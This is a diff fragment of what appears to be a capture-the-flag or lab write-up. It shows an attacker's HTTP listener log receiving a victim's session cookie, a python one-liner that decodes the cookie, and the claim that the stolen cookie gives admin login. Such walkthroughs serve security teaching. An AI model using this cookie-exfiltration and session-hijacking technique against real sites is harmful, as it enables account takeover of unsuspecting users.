@@ -84,11 +84,14 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 
 10.10.20.207 - - [18/Dec/2024 21:58:02] "GET /hacked.jpg HTTP/1.1" 200 -
 10.10.20.207 - - [18/Dec/2024 21:56:01] "GET /cookie/SESSID%3D643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777%3B%20PHPSESSID%3D643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777.jpg HTTP/1.1" 404
+```
 
+With a little bit of python magic we can transform the SESSID cookie to a format that we can use to log in as an admin!
+
+```bash
 echo "SESSID%3D643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777%3B%20PHPSESSID%3D643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))"
 
 SESSID=643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777; PHPSESSID=643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777
-
 ```
 
 And voilà, we have stolen the session cookie and can now log in as an admin and visit /portal/admin.php!
